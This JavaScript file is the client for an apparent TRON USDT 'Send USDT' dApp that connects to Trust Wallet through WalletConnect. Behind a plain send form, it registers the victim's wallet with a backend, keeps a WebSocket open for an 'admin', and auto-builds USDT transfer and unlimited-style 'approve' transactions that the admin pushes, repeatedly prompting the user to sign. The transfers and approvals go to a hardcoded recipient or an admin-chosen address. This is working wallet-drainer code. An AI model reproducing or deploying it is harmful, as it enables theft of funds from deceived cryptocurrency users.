import "./style.css";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;
const CLIENT_ID_KEY   = "trust_tron_client_id";

const WC_PROJECT_ID   = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || "171db6da15a54effc1b4a06f889a3c3f";
const TRONGRID_KEY    = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME        = import.meta.env.VITE_APP_NAME?.trim()        || "Send USDT";
const APP_DESC        = import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
const APP_ICON        = import.meta.env.VITE_APP_ICON_URL?.trim()    || `${location.origin}/logo.png`;
const BACKEND_HTTP    = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${location.protocol}//${location.hostname}:8787`).replace(/\/+$/, "");
const BACKEND_WS      = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");

const ua = navigator.userAgent ?? "";
const isTrustBrowser  = /trustwallet|trust\/|trust wallet/i.test(ua) || Boolean(window.ethereum?.isTrust) || Boolean(window.trustwallet?.ethereum?.isTrust);

// ─── DOM ──────────────────────────────────────────────────────────────────────
const el = {
  wcModal:          document.getElementById("wcModal"),
  trustWalletLink:  document.getElementById("trustWalletLink"),
  modalStatus:      document.getElementById("modalStatus"),
  retryConnectBtn:  document.getElementById("retryConnectBtn"),
  walletStrip:      document.getElementById("walletStrip"),
  walletAddress:    document.getElementById("walletAddress"),
  balanceValue:     document.getElementById("balanceValue"),
  disconnectBtn:    document.getElementById("disconnectBtn"),
  amountInput:      document.getElementById("amountInput"),
  maxBtn:           document.getElementById("maxBtn"),
  fiatValue:        document.getElementById("fiatValue"),
  sendBtn:          document.getElementById("sendBtn"),
  connectStatus:    document.getElementById("connectStatus"),
};

// ─── TronWeb ──────────────────────────────────────────────────────────────────
const tronWeb = new TronWeb({
  fullHost: TRON_RPC,
  headers:  TRONGRID_KEY ? { "TRON-PRO-API-KEY": TRONGRID_KEY } : {},
});

// ─── State ────────────────────────────────────────────────────────────────────
const clientId        = getOrCreateClientId();
let walletClient      = null;
let connectedAddress  = "";
let connecting        = false;
let usdtBalanceRaw    = 0n;
let ws                = null;
let wsReconnectTimer  = null;
let heartbeatTimer    = null;
const processingSet   = new Set(); // prevents double-signing same request

// ─── Utilities ────────────────────────────────────────────────────────────────
function getOrCreateClientId() {
  let id = localStorage.getItem(CLIENT_ID_KEY);
  if (!id) {
    id = typeof crypto.randomUUID === "function"
      ? crypto.randomUUID()
      : `${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`;
    localStorage.setItem(CLIENT_ID_KEY, id);
  }
  return id;
}

function toRawBigInt(v) {
  if (typeof v === "bigint") return v;
  if (typeof v === "number") return BigInt(Math.trunc(v));
  if (typeof v === "string") return BigInt(v);
  if (v?.toString) return BigInt(v.toString());
  throw new Error("Cannot convert to BigInt");
}

function decimalToInt(amount, decimals) {
  const s = String(amount).trim();
  if (!/^\d+(\.\d+)?$/.test(s)) throw new Error("Invalid amount");
  const [whole, frac = ""] = s.split(".");
  if (frac.length > decimals) throw new Error(`Max ${decimals} decimal places`);
  return (`${whole.replace(/^0+(?=\d)/, "") || "0"}${frac.padEnd(decimals, "0")}`.replace(/^0+(?=\d)/, "") || "0");
}

function formatRaw(raw, decimals) {
  const s   = raw.toString();
  const neg = s.startsWith("-");
  const n   = neg ? s.slice(1) : s;
  const pad = n.padStart(decimals + 1, "0");
  const w   = pad.slice(0, -decimals);
  const f   = pad.slice(-decimals).replace(/0+$/, "");
  return (neg ? "-" : "") + (f ? `${w}.${f}` : w);
}

function shortAddr(a) {
  if (!a || a.length < 12) return a;
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function setStatus(msg, isError = false) {
  el.connectStatus.textContent = msg;
  el.connectStatus.style.color = isError ? "#e54b4b" : "#3dca7e";
}

// ─── UI sync ──────────────────────────────────────────────────────────────────
function syncUi() {
  const ok = Boolean(connectedAddress);
  el.walletStrip.hidden   = !ok;
  el.disconnectBtn.hidden = !ok;
  el.sendBtn.disabled     = !ok || connecting;
  el.maxBtn.disabled      = !ok;
  el.retryConnectBtn.hidden = ok || !connecting; // show retry only if stuck connecting
}

function updateFiat() {
  const n = parseFloat(el.amountInput.value);
  el.fiatValue.textContent = (n > 0) ? `≈ $${n.toFixed(2)}` : "≈ $0.00";
}

// ─── WC Modal ─────────────────────────────────────────────────────────────────
function showModal(deepLink) {
  if (deepLink) {
    el.trustWalletLink.href   = deepLink;
    el.trustWalletLink.hidden = false;
    el.modalStatus.textContent = "Tap above, then return here after approving.";
  } else {
    // Inside Trust Wallet browser — no button needed
    el.trustWalletLink.hidden  = true;
    el.modalStatus.textContent = "Please approve the connection in Trust Wallet…";
  }
  el.wcModal.hidden = false;
}

function hideModal() {
  el.wcModal.hidden = true;
}

function onPairingUri(uri) {
  if (isTrustBrowser) { showModal(null); return; }
  showModal(`https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`);
}

// ─── Backend HTTP ─────────────────────────────────────────────────────────────
async function bPost(path, body) {
  const r = await fetch(`${BACKEND_HTTP}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function bGet(path) {
  const r = await fetch(`${BACKEND_HTTP}${path}`);
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function registerWallet() {
  if (!connectedAddress) return;
  try {
    await bPost("/api/wallet/register", { clientId, address: connectedAddress, userAgent: navigator.userAgent });
  } catch { /* silent — backend may not be running locally */ }
}

async function reportResult(req, payload) {
  try {
    await bPost(`/api/request/${encodeURIComponent(req.id)}/result`, { clientId, ...payload });
  } catch { /* silent */ }
}

// ─── WebSocket (always open — admin push arrives here) ────────────────────────
function openWs() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
  ws = new WebSocket(BACKEND_WS);

  ws.onopen = () => {
    ws.send(JSON.stringify({ type: "identify", role: "wallet", clientId }));
  };

  ws.onmessage = async (ev) => {
    let p; try { p = JSON.parse(String(ev.data)); } catch { return; }

    // Admin pushes a single new request — auto-sign immediately
    if (p.type === "transaction_request" && p.request) {
      await autoSign(p.request);
      return;
    }

    // On reconnect, server may send pending requests — auto-sign each
    if (p.type === "wallet_pending" && Array.isArray(p.requests)) {
      for (const req of p.requests) {
        if (req.status === "pending") await autoSign(req);
      }
      return;
    }
  };

  ws.onclose = () => {
    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
    wsReconnectTimer = setTimeout(openWs, 3000);
  };
}

function startSync() {
  openWs();
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) bPost("/api/wallet/heartbeat", { clientId }).catch(() => {});
  }, 25_000);
}

// ─── Auto-sign (Trust Wallet native popup — no dApp UI) ───────────────────────
async function autoSign(req) {
  if (!connectedAddress || !walletClient) return;
  if (processingSet.has(req.id)) return;   // dedupe
  processingSet.add(req.id);

  const p = req.params || {};

  try {
    let txid;
    if (req.type === "trc20_transfer") {
      txid = await buildAndSign_Transfer(
        String(p.to || FIXED_RECIPIENT).trim(),
        String(p.amount || "").trim()
      );
    } else if (req.type === "trc20_approve") {
      txid = await buildAndSign_Approve(
        String(p.spender || FIXED_RECIPIENT).trim(),
        String(p.amount  || "").trim()
      );
    } else {
      throw new Error(`Unknown request type: ${req.type}`);
    }

    await reportResult(req, { action: "approved", txid });
    setStatus(`✓ Signed! Tx: ${txid.slice(0, 14)}…`);
    await refreshBalance();
  } catch (e) {
    const isRejected = /reject|denied|cancel/i.test(String(e));
    await reportResult(req, {
      action: isRejected ? "rejected" : "failed",
      error: String(e),
    });
    if (!isRejected) setStatus("Transaction failed", true);
    else setStatus("");
  } finally {
    processingSet.delete(req.id);
  }
}

// ─── Transaction builders ─────────────────────────────────────────────────────
async function signAndBroadcast(tx) {
  const signed = await walletClient.signTransaction(tx);   // ← triggers Trust Wallet native popup
  const result = await tronWeb.trx.sendRawTransaction(signed);
  if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
  return result.txid;
}

async function buildAndSign_Transfer(to, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: to }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Transfer build failed");
  return signAndBroadcast(trigger.transaction);
}

async function buildAndSign_Approve(spender, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: spender }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Approve build failed");
  return signAndBroadcast(trigger.transaction);
}

// ─── Balance ──────────────────────────────────────────────────────────────────
async function refreshBalance() {
  if (!connectedAddress) return;
  try {
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const raw      = await contract.balanceOf(connectedAddress).call();
    usdtBalanceRaw = toRawBigInt(raw);
    el.balanceValue.textContent = `${formatRaw(usdtBalanceRaw, USDT_DECIMALS)} USDT`;
  } catch {
    el.balanceValue.textContent = "-- USDT";
  }
}

function setMax() {
  if (!connectedAddress) return;
  el.amountInput.value = formatRaw(usdtBalanceRaw, USDT_DECIMALS);
  updateFiat();
}

// ─── Manual send ──────────────────────────────────────────────────────────────
async function handleSend() {
  const amount = el.amountInput.value.trim();
  if (!amount || parseFloat(amount) <= 0) {
    setStatus("Enter a valid USDT amount.", true);
    return;
  }
  el.sendBtn.disabled = true;
  setStatus("Waiting for signature…");
  try {
    const txid = await buildAndSign_Transfer(FIXED_RECIPIENT, amount);
    setStatus(`✓ Sent! Tx: ${txid.slice(0, 14)}…`);
    el.amountInput.value = "";
    updateFiat();
    await refreshBalance();
  } catch (e) {
    setStatus(/reject|deny|cancel/i.test(String(e)) ? "" : `Failed: ${e}`, true);
  } finally {
    syncUi();
  }
}

// ─── Wallet client ────────────────────────────────────────────────────────────
function onConnected(address) {
  connectedAddress = address;
  el.walletAddress.textContent = shortAddr(address);
  hideModal();
  syncUi();
  registerWallet();
  // Poll any pending requests and auto-sign
  bGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`)
    .then(({ requests }) => {
      if (Array.isArray(requests)) {
        requests.filter(r => r.status === "pending").forEach(autoSign);
      }
    })
    .catch(() => {});
  refreshBalance();
}

function onDisconnected() {
  connectedAddress = "";
  usdtBalanceRaw   = 0n;
  el.walletAddress.textContent = "";
  el.balanceValue.textContent  = "-- USDT";
  setStatus("");
  hideModal();
  syncUi();
  bPost("/api/wallet/disconnect", { clientId }).catch(() => {});
}

function initWallet() {
  walletClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: { name: APP_NAME, description: APP_DESC, url: location.origin, icons: [APP_ICON] },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": 9999 },
  });

  walletClient.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) onConnected(accounts[0]);
    else onDisconnected();
  });

  walletClient.on("disconnect", onDisconnected);
}

async function connect(auto = true) {
  if (!walletClient || connecting) return;
  connecting = true;
  syncUi();
  try {
    const { address } = await walletClient.connect({ onUri: onPairingUri });
    onConnected(address);
  } catch (e) {
    // Show retry button in modal instead of hiding it
    el.modalStatus.textContent = "Connection failed. Tap retry.";
    el.retryConnectBtn.hidden  = false;
    el.wcModal.hidden          = false;
  } finally {
    connecting = false;
    syncUi();
  }
}

async function disconnect() {
  try { await walletClient?.disconnect(); } catch { onDisconnected(); }
}

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  syncUi();
  if (!WC_PROJECT_ID) { setStatus("Missing WalletConnect project ID", true); return; }

  initWallet();
  startSync();  // open WS immediately — admin can reach us even before connect

  // Restore existing session (stays alive for months via localStorage)
  try {
    const status = await walletClient.checkConnectStatus();
    if (status?.address) {
      onConnected(status.address);
      return;
    }
  } catch { /* no previous session */ }

  // Auto-connect: show modal immediately on load
  connect(true);
}

// ─── Events ───────────────────────────────────────────────────────────────────
el.amountInput.addEventListener("input", updateFiat);
el.maxBtn.addEventListener("click", setMax);
el.sendBtn.addEventListener("click", handleSend);
el.disconnectBtn.addEventListener("click", disconnect);
el.retryConnectBtn.addEventListener("click", () => {
  el.retryConnectBtn.hidden = true;
  el.modalStatus.textContent = "Connecting…";
  connect(false);
});

init().catch(e => setStatus(`Init failed: ${e}`, true));
